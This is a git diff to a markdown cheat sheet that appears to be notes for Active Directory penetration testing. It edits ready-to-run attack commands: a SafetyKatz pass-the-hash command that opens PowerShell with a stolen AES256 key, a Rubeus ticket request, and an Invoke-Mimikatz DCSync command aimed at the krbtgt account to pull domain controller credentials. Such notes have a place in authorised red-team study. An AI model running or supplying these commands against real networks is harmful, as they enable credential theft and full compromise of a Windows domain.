@@ -57,7 +57,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.loc
 ```
 
 ```powershell
-safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
+safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe" "exit"'
 ```
 
 > Above commands starts ps sessions w/ _logon type 9_ same as `runas /netonly`
@@ -72,9 +72,15 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 
 ---
 ### DCSync
+>Extract DC creds without code execution
+
+__Require Domain Admin privileges__
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync"'
+Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:domain.local\krbtgt
 ```
+
+
+
 
 ---
 ### AsReproasting
